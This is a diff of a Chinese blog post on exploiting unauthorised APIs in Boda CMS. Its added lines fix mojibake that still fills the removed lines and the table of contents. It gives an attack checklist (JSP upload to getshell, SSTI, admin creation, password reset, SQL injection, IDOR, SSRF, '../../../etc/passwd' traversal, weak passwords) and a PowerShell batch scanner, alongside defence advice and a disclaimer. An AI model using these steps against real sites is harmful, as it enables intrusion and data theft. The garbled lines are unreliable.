+<li><input disabled="" type="checkbox"> Swagger 文档泄露检测：<code>/swagger-ui.html</code> <code>/v2/api-docs</code></li>
+<li><input disabled="" type="checkbox"> Druid 监控未授权：<code>/druid/index.html</code></li>
+<li><input disabled="" type="checkbox"> 敏感路径爆破：<code>/api/</code> <code>/vsb/api/</code> <code>/cms/api/</code></li>
+<li><input disabled="" type="checkbox"> JS 文件反编译：搜索 <code>api/</code> 关键字</li>
 </ul>
-<h3 id="Phase-2锛氭湭鎺堟潈-API-妫€娴"><a href="#Phase-2锛氭湭鎺堟潈-API-妫€娴" class="headerlink" title="Phase 2锛氭湭鎺堟潈 API 妫€娴?"></a>Phase 2锛氭湭鎺堟潈 API 妫€娴?</h3><p>*<em>P0 绾?鈥?鏂囦欢涓婁紶锛?</em></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 快速 JS 反编译找 API</span></span><br><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://target.com/vsb/js/main.js&quot;</span> | <span class="built_in">Select-String</span> <span class="literal">-Pattern</span> <span class="string">&quot;api/|\.do|\.action&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Phase-2：未授权-API-检测"><a href="#Phase-2：未授权-API-检测" class="headerlink" title="Phase 2：未授权 API 检测"></a>Phase 2：未授权 API 检测</h3><p><strong>P0 级 — 文件上传：</strong></p>
 <ul>
-<li><input disabled="" type="checkbox"> <code>POST /api/upload</code> 鈫?涓婁紶 JSP 娴嬭瘯</li>
-<li><input disabled="" type="checkbox"> <code>POST /vsb/uploadFile</code> 鈫?涓婁紶 JSP 娴嬭瘯</li>
-<li><input disabled="" type="checkbox"> <code>POST /cms/api/upload</code> 鈫?涓婁紶 JSP 娴嬭瘯</li>
-<li><input disabled="" type="checkbox"> <code>POST /siteadmin/upload</code> 鈫?涓婁紶 JSP 娴嬭瘯</li>
+<li><input disabled="" type="checkbox"> <code>POST /api/upload</code> → 上传 JSP 测试</li>
+<li><input disabled="" type="checkbox"> <code>POST /vsb/uploadFile</code> → 上传 JSP 测试</li>
+<li><input disabled="" type="checkbox"> <code>POST /cms/api/upload</code> → 上传 JSP 测试</li>
+<li><input disabled="" type="checkbox"> <code>POST /siteadmin/upload</code> → 上传 JSP 测试</li>
 </ul>
-<p>*<em>P0 绾?鈥?妯℃澘娉ㄥ叆锛?</em></p>
+<p><strong>P0 级 — 模板注入：</strong></p>
 <ul>
-<li><input disabled="" type="checkbox"> <code>POST /api/template/save</code> 鈫?SSTI payload 娴嬭瘯</li>
-<li><input disabled="" type="checkbox"> <code>POST /api/template/edit</code> 鈫?SSTI payload 娴嬭瘯</li>
+<li><input disabled="" type="checkbox"> <code>POST /api/template/save</code> → SSTI payload 测试</li>
+<li><input disabled="" type="checkbox"> <code>POST /api/template/edit</code> → SSTI payload 测试</li>
 </ul>
-<p>*<em>P1 绾?鈥?淇℃伅娉勯湶锛?</em></p>
+<p><strong>P1 级 — 信息泄露：</strong></p>
 <ul>
-<li><input disabled="" type="checkbox"> <code>GET /api/user/list</code> 鈫?鐢ㄦ埛鍒楄〃娉勯湶</li>
-<li><input disabled="" type="checkbox"> <code>GET /api/config</code> 鈫?绯荤粺閰嶇疆娉勯湶</li>
-<li><input disabled="" type="checkbox"> <code>GET /api/database</code> 鈫?鏁版嵁搴撻厤缃硠闇?- [ ] <code>GET /api/site/list</code> 鈫?绔欑偣鍒楄〃娉勯湶</li>
+<li><input disabled="" type="checkbox"> <code>GET /api/user/list</code> → 用户列表泄露</li>
+<li><input disabled="" type="checkbox"> <code>GET /api/config</code> → 系统配置泄露</li>
+<li><input disabled="" type="checkbox"> <code>GET /api/database</code> → 数据库配置泄露</li>
+<li><input disabled="" type="checkbox"> <code>GET /api/site/list</code> → 站点列表泄露</li>
 </ul>
-<p>*<em>P1 绾?鈥?鐢ㄦ埛绠＄悊锛?</em></p>
+<p><strong>P1 级 — 用户管理：</strong></p>
 <ul>
-<li><input disabled="" type="checkbox"> <code>POST /api/user/add?role=admin</code> 鈫?娣诲姞绠＄悊鍛?- [ ] <code>POST /api/user/resetPassword</code> 鈫?閲嶇疆浠绘剰瀵嗙爜</li>
-<li><input disabled="" type="checkbox"> <code>POST /api/user/login</code> 鈫?SQL 娉ㄥ叆娴嬭瘯</li>
+<li><input disabled="" type="checkbox"> <code>POST /api/user/add?role=admin</code> → 添加管理员</li>
+<li><input disabled="" type="checkbox"> <code>POST /api/user/resetPassword</code> → 重置任意密码</li>
+<li><input disabled="" type="checkbox"> <code>POST /api/user/login</code> → SQL 注入测试</li>
 </ul>
-<p>*<em>P1 绾?鈥?IDOR锛?</em></p>
+<p><strong>P1 级 — IDOR：</strong></p>
 <ul>
-<li><input disabled="" type="checkbox"> 閬嶅巻 <code>siteId=1,2,3...</code> 鈫?璺ㄧ珯鎿嶄綔</li>
-<li><input disabled="" type="checkbox"> 閬嶅巻 <code>articleId=1,2,3...</code> 鈫?璺ㄧ珯鏁版嵁鑾峰彇</li>
+<li><input disabled="" type="checkbox"> 遍历 <code>siteId=1,2,3...</code> → 跨站操作</li>
+<li><input disabled="" type="checkbox"> 遍历 <code>articleId=1,2,3...</code> → 跨站数据获取</li>
 </ul>
-<p>*<em>P2 绾?鈥?SSRF&#x2F;鐩綍閬嶅巻锛?</em></p>
+<p><strong>P2 级 — SSRF&#x2F;目录遍历：</strong></p>
 <ul>
-<li><input disabled="" type="checkbox"> <code>GET /api/import?url=http://鍐呯綉IP</code> 鈫?SSRF</li>
-<li><input disabled="" type="checkbox"> <code>GET /api/download?file=../../../etc/passwd</code> 鈫?鐩綍閬嶅巻</li>
+<li><input disabled="" type="checkbox"> <code>GET /api/import?url=http://内网IP</code> → SSRF</li>
+<li><input disabled="" type="checkbox"> <code>GET /api/download?file=../../../etc/passwd</code> → 目录遍历</li>
 </ul>
-<p><strong>P3 绾?鈥?寮卞彛浠わ細</strong></p>
+<p><strong>P3 级 — 弱口令：</strong></p>
 <ul>
-<li><input disabled="" type="checkbox"> <code>admin/admin</code> 鐧诲綍娴嬭瘯</li>
-<li><input disabled="" type="checkbox"> <code>admin/admin123</code> 鐧诲綍娴嬭瘯</li>
-<li><input disabled="" type="checkbox"> 鐖嗙牬 <code>/vsb/admin/</code> 鍚庡彴</li>
+<li><input disabled="" type="checkbox"> <code>admin/admin</code> 登录测试</li>
+<li><input disabled="" type="checkbox"> <code>admin/admin123</code> 登录测试</li>
+<li><input disabled="" type="checkbox"> 爆破 <code>/vsb/admin/</code> 后台</li>
 </ul>
-<h3 id="Phase-3锛氭繁搴﹀埄鐢"><a href="#Phase-3锛氭繁搴﹀埄鐢" class="headerlink" title="Phase 3锛氭繁搴﹀埄鐢?"></a>Phase 3锛氭繁搴﹀埄鐢?</h3><ul>
-<li><input disabled="" type="checkbox"> 浠?Druid Session 娉勯湶绐冨彇绠＄悊鍛樹細璇?- [ ] 浠庝俊鎭硠闇茶幏鍙栨暟鎹簱鍑瘉 鈫?杩炴帴鏁版嵁搴撴嫋鍙栧悗鍙拌处鍙?- [ ] 閫氳繃鏂囦欢涓婁紶 Getshell 鈫?鎻愭潈</li>
-<li><input disabled="" type="checkbox"> 浠?SSRF 鍚戝唴缃戞墿灞曟敾鍑婚潰</li>
-<li><input disabled="" type="checkbox"> 閫氳繃鐩綍閬嶅巻涓嬭浇鍏ㄩ儴婧愮爜 鈫?鐧界洅瀹¤鏇村婕忔礊</li>
+<h3 id="Phase-3：深度利用"><a href="#Phase-3：深度利用" class="headerlink" title="Phase 3：深度利用"></a>Phase 3：深度利用</h3><ul>
+<li><input disabled="" type="checkbox"> 从 Druid Session 泄露窃取管理员会话</li>
+<li><input disabled="" type="checkbox"> 从信息泄露获取数据库凭证 → 连接数据库拖取后台账号</li>
+<li><input disabled="" type="checkbox"> 通过文件上传 Getshell → 提权</li>
+<li><input disabled="" type="checkbox"> 从 SSRF 向内网扩展攻击面</li>
+<li><input disabled="" type="checkbox"> 通过目录遍历下载全部源码 → 白盒审计更多漏洞</li>
 </ul>
 <hr>
-<h2 id="鍏€侀槻寰″缓璁"><a href="#鍏€侀槻寰″缓璁" class="headerlink" title="鍏€侀槻寰″缓璁?"></a>鍏€侀槻寰″缓璁?</h2><h3 id="8-1-瀵硅繍缁存柟"><a href="#8-1-瀵硅繍缁存柟" class="headerlink" title="8.1 瀵硅繍缁存柟"></a>8.1 瀵硅繍缁存柟</h3><table>
+<h2 id="八、防御建议"><a href="#八、防御建议" class="headerlink" title="八、防御建议"></a>八、防御建议</h2><h3 id="8-1-对运维方"><a href="#8-1-对运维方" class="headerlink" title="8.1 对运维方"></a>8.1 对运维方</h3><table>
 <thead>
 <tr>
-<th align="left">鎺柦</th>
-<th align="left">璇存槑</th>
+<th align="left">措施</th>
+<th align="left">说明</th>
 </tr>
 </thead>
 <tbody><tr>
-<td align="left"><strong>缁熶竴閴存潈</strong></td>
-<td align="left">鎵€鏈?API 绔偣蹇呴』鏍￠獙韬唤鍜屾潈闄愶紝浣跨敤 Spring Security&#x2F;Shiro 妗嗘灦</td>
+<td align="left"><strong>统一鉴权</strong></td>
+<td align="left">所有 API 端点必须校验身份和权限，使用 Spring Security&#x2F;Shiro 框架</td>
 </tr>
 <tr>
-<td align="left"><strong>鍏抽棴 Swagger</strong></td>
-<td align="left">鐢熶骇鐜绂佺敤 Swagger 鏂囨。灞曠ず</td>
+<td align="left"><strong>关闭 Swagger</strong></td>
+<td align="left">生产环境禁用 Swagger 文档展示</td>
 </tr>
 <tr>
-<td align="left">*<em>Druid 鍔犺闂帶鍒?</em></td>
-<td align="left"><code>/druid/*</code> 璺緞闄愬埗鍐呯綉鎴栧姞鐧诲綍楠岃瘉</td>
+<td align="left"><strong>Druid 加访问控制</strong></td>
+<td align="left"><code>/druid/*</code> 路径限制内网或加登录验证</td>
 </tr>
 <tr>
-<td align="left">*<em>鏈€灏忔潈闄愬師鍒?</em></td>
-<td align="left">API 鍙繑鍥炲繀瑕佸瓧娈碉紝涓嶆毚闇叉暟鎹簱&#x2F;Session&#x2F;瀵嗙爜淇℃伅</td>
+<td align="left"><strong>最小权限原则</strong></td>
+<td align="left">API 只返回必要字段，不暴露数据库&#x2F;Session&#x2F;密码信息</td>
 </tr>
 <tr>
-<td align="left"><strong>API 缃戝叧</strong></td>
-<td align="left">閫氳繃 Nginx&#x2F;APISIX 缁熶竴绠℃帶 API 璁块棶</td>
+<td align="left"><strong>API 网关</strong></td>
+<td align="left">通过 Nginx&#x2F;APISIX 统一管控 API 访问</td>
 </tr>
 <tr>
-<td align="left"><strong>鍙婃椂鍗囩骇</strong></td>
-<td align="left">鑱旂郴鍗氳揪鍘傚晢鑾峰彇鏈€鏂扮増鏈ˉ涓?</td>
+<td align="left"><strong>及时升级</strong></td>
+<td align="left">联系博达厂商获取最新版本补丁</td>
 </tr>
 <tr>
-<td align="left"><strong>WAF 瑙勫垯</strong></td>
-<td align="left">瀵?<code>/api/</code> 璺緞閰嶇疆涓ユ牸 ACL</td>
+<td align="left"><strong>WAF 规则</strong></td>
+<td align="left">对 <code>/api/</code> 路径配置严格 ACL</td>
 </tr>
 <tr>
-<td align="left"><strong>鏂囦欢涓婁紶鏍￠獙</strong></td>
-<td align="left">鐧藉悕鍗曞悗缂€ + 鍐呭妫€娴?+ 涓嶅彲鎵ц鐩綍瀛樺偍</td>
+<td align="left"><strong>文件上传校验</strong></td>
+<td align="left">白名单后缀 + 内容检测 + 不可执行目录存储</td>
 </tr>
 </tbody></table>
-<h3 id="8-2-瀵规祴璇曟柟"><a href="#8-2-瀵规祴璇曟柟" class="headerlink" title="8.2 瀵规祴璇曟柟"></a>8.2 瀵规祴璇曟柟</h3><table>
+<h3 id="8-2-对测试方"><a href="#8-2-对测试方" class="headerlink" title="8.2 对测试方"></a>8.2 对测试方</h3><table>
 <thead>
 <tr>
-<th align="left">鍘熷垯</th>
-<th align="left">璇存槑</th>
+<th align="left">原则</th>
+<th align="left">说明</th>
 </tr>
 </thead>
 <tbody><tr>
-<td align="left">鍚堟硶鎺堟潈</td>
-<td align="left">鎵€鏈夋祴璇曞繀椤诲湪鎺堟潈鑼冨洿鍐呰繘琛?</td>
+<td align="left">合法授权</td>
+<td align="left">所有测试必须在授权范围内进行</td>
 </tr>
 <tr>
-<td align="left">涓嶈秺绾㈢嚎</td>
-<td align="left">绂佹 <code>--dump</code> 鎷栧簱銆佺姝?DDOS銆佺姝㈢牬鍧忔€ф搷浣?</td>
+<td align="left">不越红线</td>
+<td align="left">禁止 <code>--dump</code> 拖库、禁止 DDOS、禁止破坏性操作</td>
 </tr>
 <tr>
-<td align="left">鏈€灏忓寲璇佹嵁</td>
-<td align="left">淇℃伅娉勯湶绫讳粎鎴彇蹇呰鍑瘉鍗冲彲璇佹槑锛屼笉涓嬭浇鍏ㄩ噺鏁版嵁</td>
+<td align="left">最小化证据</td>
+<td align="left">信息泄露类仅截取必要凭证即可证明，不下载全量数据</td>
 </tr>
 <tr>
-<td align="left">鍙婃椂鎶ュ憡</td>
-<td align="left">鍙戠幇 API 鏈巿鏉冩紡娲炲悗鍙婃椂鎻愪氦鑷?SRC 鎴栫敤鎴峰崟浣?</td>
+<td align="left">及时报告</td>
+<td align="left">发现 API 未授权漏洞后及时提交至 SRC 或用户单位</td>
 </tr>
 </tbody></table>
 <hr>
-<h2 id="闄勶細鏌ヨ鑴氭湰"><a href="#闄勶細鏌ヨ鑴氭湰" class="headerlink" title="闄勶細鏌ヨ鑴氭湰"></a>闄勶細鏌ヨ鑴氭湰</h2><h3 id="鎵归噺妫€娴嬭剼鏈紙PowerShell锛"><a href="#鎵归噺妫€娴嬭剼鏈紙PowerShell锛" class="headerlink" title="鎵归噺妫€娴嬭剼鏈紙PowerShell锛?"></a>鎵归噺妫€娴嬭剼鏈紙PowerShell锛?</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 鍗氳揪CMS API鏈巿鏉冩壒閲忔娴?$targets = @(</span></span><br><span class="line">  <span class="string">&quot;http://target1.edu.cn&quot;</span>,</span><br><span class="line">  <span class="string">&quot;http://target2.edu.cn&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="variable">$checks</span> = <span class="selector-tag">@</span>(</span><br><span class="line">  <span class="selector-tag">@</span>&#123;Path=<span class="string">&quot;/api/user/list&quot;</span>; Method=<span class="string">&quot;GET&quot;</span>; Desc=<span class="string">&quot;鐢ㄦ埛鍒楄〃娉勯湶&quot;</span>&#125;,</span><br><span class="line">  <span class="selector-tag">@</span>&#123;Path=<span class="string">&quot;/api/config&quot;</span>; Method=<span class="string">&quot;GET&quot;</span>; Desc=<span class="string">&quot;绯荤粺閰嶇疆娉勯湶&quot;</span>&#125;,</span><br><span class="line">  <span class="selector-tag">@</span>&#123;Path=<span class="string">&quot;/druid/index.html&quot;</span>; Method=<span class="string">&quot;GET&quot;</span>; Desc=<span class="string">&quot;Druid鐩戞帶&quot;</span>&#125;,</span><br><span class="line">  <span class="selector-tag">@</span>&#123;Path=<span class="string">&quot;/swagger-ui.html&quot;</span>; Method=<span class="string">&quot;GET&quot;</span>; Desc=<span class="string">&quot;Swagger鏂囨。&quot;</span>&#125;,</span><br><span class="line">  <span class="selector-tag">@</span>&#123;Path=<span class="string">&quot;/api/upload&quot;</span>; Method=<span class="string">&quot;POST&quot;</span>; Desc=<span class="string">&quot;鏂囦欢涓婁紶鎺ュ彛&quot;</span>&#125;,</span><br><span class="line">  <span class="selector-tag">@</span>&#123;Path=<span class="string">&quot;/vsb/admin/&quot;</span>; Method=<span class="string">&quot;GET&quot;</span>; Desc=<span class="string">&quot;鍚庡彴鐧诲綍椤?&#125;</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">foreach (<span class="variable">$target</span> in <span class="variable">$targets</span>) &#123;</span></span><br><span class="line"><span class="string">  Write-Host &quot;</span>`n=== 妫€娴嬬洰鏍? <span class="variable">$target</span> ===<span class="string">&quot; -ForegroundColor Cyan</span></span><br><span class="line"><span class="string">  foreach (<span class="variable">$check</span> in <span class="variable">$checks</span>) &#123;</span></span><br><span class="line"><span class="string">    <span class="variable">$url</span> = <span class="variable">$target</span>.TrimEnd(&#x27;/&#x27;) + <span class="variable">$check</span>.Path</span></span><br><span class="line"><span class="string">    try &#123;</span></span><br><span class="line"><span class="string">      <span class="variable">$resp</span> = Invoke-WebRequest -Uri <span class="variable">$url</span> -Method <span class="variable">$check</span>.Method -TimeoutSec 10 -UseBasicParsing</span></span><br><span class="line"><span class="string">      if (<span class="variable">$resp</span>.StatusCode -eq 200) &#123;</span></span><br><span class="line"><span class="string">        Write-Host &quot;</span>[<span class="type">FOUND</span>] <span class="variable">$</span>(<span class="variable">$check</span>.Desc) =&gt; <span class="variable">$url</span> (Status: <span class="variable">$</span>(<span class="variable">$resp</span>.StatusCode))<span class="string">&quot; -ForegroundColor Green</span></span><br><span class="line"><span class="string">      &#125; else &#123;</span></span><br><span class="line"><span class="string">        Write-Host &quot;</span>[<span class="type">SKIP</span>] <span class="variable">$</span>(<span class="variable">$check</span>.Desc) =&gt; <span class="variable">$url</span> (Status: <span class="variable">$</span>(<span class="variable">$resp</span>.StatusCode))<span class="string">&quot; -ForegroundColor Gray</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">    &#125; catch &#123;</span></span><br><span class="line"><span class="string">      Write-Host &quot;</span>[<span class="type">ERR</span>]  <span class="variable">$</span>(<span class="variable">$check</span>.Desc) =&gt; <span class="variable">$url</span> (<span class="variable">$</span>(<span class="variable">$_</span>.Exception.Message))<span class="string">&quot; -ForegroundColor DarkGray</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
+<h2 id="附：查询脚本"><a href="#附：查询脚本" class="headerlink" title="附：查询脚本"></a>附：查询脚本</h2><h3 id="批量检测脚本（PowerShell）"><a href="#批量检测脚本（PowerShell）" class="headerlink" title="批量检测脚本（PowerShell）"></a>批量检测脚本（PowerShell）</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 博达CMS API未授权批量检测</span></span><br><span class="line"><span class="variable">$targets</span> = <span class="selector-tag">@</span>(</span><br><span class="line">  <span class="string">&quot;http://target1.edu.cn&quot;</span>,</span><br><span class="line">  <span class="string">&quot;http://target2.edu.cn&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="variable">$checks</span> = <span class="selector-tag">@</span>(</span><br><span class="line">  <span class="selector-tag">@</span>&#123;Path=<span class="string">&quot;/api/user/list&quot;</span>; Method=<span class="string">&quot;GET&quot;</span>; Desc=<span class="string">&quot;用户列表泄露&quot;</span>&#125;,</span><br><span class="line">  <span class="selector-tag">@</span>&#123;Path=<span class="string">&quot;/api/config&quot;</span>; Method=<span class="string">&quot;GET&quot;</span>; Desc=<span class="string">&quot;系统配置泄露&quot;</span>&#125;,</span><br><span class="line">  <span class="selector-tag">@</span>&#123;Path=<span class="string">&quot;/druid/index.html&quot;</span>; Method=<span class="string">&quot;GET&quot;</span>; Desc=<span class="string">&quot;Druid监控&quot;</span>&#125;,</span><br><span class="line">  <span class="selector-tag">@</span>&#123;Path=<span class="string">&quot;/swagger-ui.html&quot;</span>; Method=<span class="string">&quot;GET&quot;</span>; Desc=<span class="string">&quot;Swagger文档&quot;</span>&#125;,</span><br><span class="line">  <span class="selector-tag">@</span>&#123;Path=<span class="string">&quot;/api/upload&quot;</span>; Method=<span class="string">&quot;POST&quot;</span>; Desc=<span class="string">&quot;文件上传接口&quot;</span>&#125;,</span><br><span class="line">  <span class="selector-tag">@</span>&#123;Path=<span class="string">&quot;/vsb/admin/&quot;</span>; Method=<span class="string">&quot;GET&quot;</span>; Desc=<span class="string">&quot;后台登录页&quot;</span>&#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$target</span> <span class="keyword">in</span> <span class="variable">$targets</span>) &#123;</span><br><span class="line">  <span class="built_in">Write-Host</span> <span class="string">&quot;`n=== 检测目标: <span class="variable">$target</span> ===&quot;</span> <span class="literal">-ForegroundColor</span> Cyan</span><br><span class="line">  <span class="keyword">foreach</span> (<span class="variable">$check</span> <span class="keyword">in</span> <span class="variable">$checks</span>) &#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$target</span>.TrimEnd(<span class="string">&#x27;/&#x27;</span>) + <span class="variable">$check</span>.Path</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="variable">$resp</span> = <span class="built_in">Invoke-WebRequest</span> <span class="literal">-Uri</span> <span class="variable">$url</span> <span class="literal">-Method</span> <span class="variable">$check</span>.Method <span class="literal">-TimeoutSec</span> <span class="number">10</span> <span class="literal">-UseBasicParsing</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$resp</span>.StatusCode <span class="operator">-eq</span> <span class="number">200</span>) &#123;</span><br><span class="line">        <span class="built_in">Write-Host</span> <span class="string">&quot;[FOUND] <span class="variable">$</span>(<span class="variable">$check</span>.Desc) =&gt; <span class="variable">$url</span> (Status: <span class="variable">$</span>(<span class="variable">$resp</span>.StatusCode))&quot;</span> <span class="literal">-ForegroundColor</span> Green</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">Write-Host</span> <span class="string">&quot;[SKIP] <span class="variable">$</span>(<span class="variable">$check</span>.Desc) =&gt; <span class="variable">$url</span> (Status: <span class="variable">$</span>(<span class="variable">$resp</span>.StatusCode))&quot;</span> <span class="literal">-ForegroundColor</span> Gray</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">      <span class="built_in">Write-Host</span> <span class="string">&quot;[ERR]  <span class="variable">$</span>(<span class="variable">$check</span>.Desc) =&gt; <span class="variable">$url</span> (<span class="variable">$</span>(<span class="variable">$_</span>.Exception.Message))&quot;</span> <span class="literal">-ForegroundColor</span> DarkGray</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <hr>
 <blockquote>
-<p><strong>鍏嶈矗澹版槑</strong>锛氭湰鏂囨。浠呬緵瀹夊叏鐮旂┒鍜屾巿鏉冩祴璇曚娇鐢ㄣ€傛湭缁忔巿鏉冪殑 API 鏈巿鏉冭闂娴嬪彲鑳芥瀯鎴愯繚娉曡涓猴紝璇蜂弗鏍奸伒瀹堛€婄綉缁滃畨鍏ㄦ硶銆嬪強鐩稿叧娉曞緥娉曡銆</p>
+<p><strong>免责声明</strong>：本文档仅供安全研究和授权测试使用。未经授权的 API 未授权访问检测可能构成违法行为，请严格遵守《网络安全法》及相关法律法规。</p>
 </blockquote>
 
     </div>
@@ -566,7 +745,6 @@
           <div class="post-tags">
               <a href="/tags/API/" rel="tag"># API</a>
               <a href="/tags/%E6%9C%AA%E6%8E%88%E6%9D%83/" rel="tag"># 未授权</a>
-              <a href="/tags/%E6%BC%8F%E6%B4%9E/" rel="tag"># 漏洞</a>
               <a href="/tags/CMS/" rel="tag"># CMS</a>
           </div>
 
@@ -576,8 +754,8 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2026/07/09/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87/" rel="prev" title="验证码绕过技术详解">
-      <i class="fa fa-chevron-left"></i> 验证码绕过技术详解
+    <a href="/2026/07/09/%E4%BB%8A%E6%97%A5%E6%BC%8F%E6%B4%9E%E7%AE%80%E6%8A%A5/" rel="prev" title="今日漏洞简报">
+      <i class="fa fa-chevron-left"></i> 今日漏洞简报
     </a></div>
       <div class="post-nav-item">
     <a href="/2026/07/09/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/" rel="next" title="渗透测试常见问题汇总">
@@ -641,7 +819,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%8D%97%E6%B0%B3%E6%8F%AACMS-API%E9%8F%88%EE%81%85%E5%B7%BF%E9%8F%89%E5%86%AD%EE%86%96%E9%97%82%EE%86%BD%E7%B4%A1%E5%A8%B2%E7%82%B2%E5%9E%8E%E9%8F%8B%E6%84%AA%E7%AC%8C%E9%8D%92%E2%95%83%E6%95%A4%E9%8E%B8%E5%9B%A7%E5%B4%A1"><span class="nav-number">1.</span> <span class="nav-text">鍗氳揪CMS API鏈巿鏉冭闂紡娲炲垎鏋愪笌鍒╃敤鎸囧崡</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%90%A9%EE%86%BC%E7%B6%8D"><span class="nav-number">1.1.</span> <span class="nav-text">鐩綍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B6%93%E2%82%AC%E9%8A%86%E4%BD%B7%E9%AA%87%E9%8D%9D%E4%BD%BD%E5%84%97%E9%8F%85%EE%88%99%E7%AC%8C%E9%90%97%E7%91%B0%E7%B7%9B%E7%92%87%E5%97%97%E5%9F%86"><span class="nav-number">1.2.</span> <span class="nav-text">涓€銆佷骇鍝佽儗鏅笌鐗瑰緛璇嗗埆</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-%E6%B5%9C%D1%83%E6%90%A7%E5%A7%92%E5%82%9D%E5%A0%AA"><span class="nav-number">1.2.1.</span> <span class="nav-text">1.1 浜у搧姒傝堪</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-%E9%8E%B8%E5%9B%A9%E6%B1%97%E9%90%97%E7%91%B0%E7%B7%9B"><span class="nav-number">1.2.2.</span> <span class="nav-text">1.2 鎸囩汗鐗瑰緛</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#HTTP-%E9%8D%9D%E5%B6%85%E7%B0%B2%E6%BE%B6%E5%AF%B8%E5%A3%92%E5%AF%B0"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">HTTP 鍝嶅簲澶寸壒寰?&#96;&#96;&#96;</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A6%9B%E6%A8%BF%EE%85%BB%E7%BB%94%EE%88%9A%E5%BD%9B"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">榛樿绔彛</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%94%AF%E6%AD%8C%EE%9D%86%E9%8D%9A%E5%BA%A1%E5%BD%B4%E7%92%BA%EE%88%9A%E7%B7%9E"><span class="nav-number">1.2.2.3.</span> <span class="nav-text">甯歌鍚庡彴璺緞</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%94%AF%E6%AD%8C%EE%9D%86%E6%B6%93%E5%A9%81%E7%B4%B6%E7%BB%94%EE%88%9C%E5%81%A3%E9%94%9B%E5%A0%A5%E6%B8%B6%E7%80%B9%E7%82%BA%E6%AA%AF%E9%8E%B6%E6%92%B3%E5%BD%87%E9%8E%B4-JS-%E9%8D%99%E5%B6%87%E7%B4%AA%E7%92%87%E6%88%A0%E2%80%98%E7%92%81%E3%82%8F%E7%B4%9A"><span class="nav-number">2.</span> <span class="nav-text">甯歌涓婁紶绔偣锛堥渶瀹為檯鎶撳彇鎴?JS 鍙嶇紪璇戠‘璁わ級</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-%E5%A6%AF%E2%84%83%E6%BE%98%E5%A8%89%E3%84%A5%E5%8F%86-SSTI-%E9%88%AB-RCE"><span class="nav-number">2.0.1.</span> <span class="nav-text">3.2 妯℃澘娉ㄥ叆 &#x2F; SSTI 鈫?RCE</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A6%AB%E2%82%AC%E5%A8%B4%E5%AC%AA%E5%8F%86%E9%8D%99"><span class="nav-number">2.0.1.1.</span> <span class="nav-text">妫€娴嬪叆鍙?</span></a></li><li class="nav-item 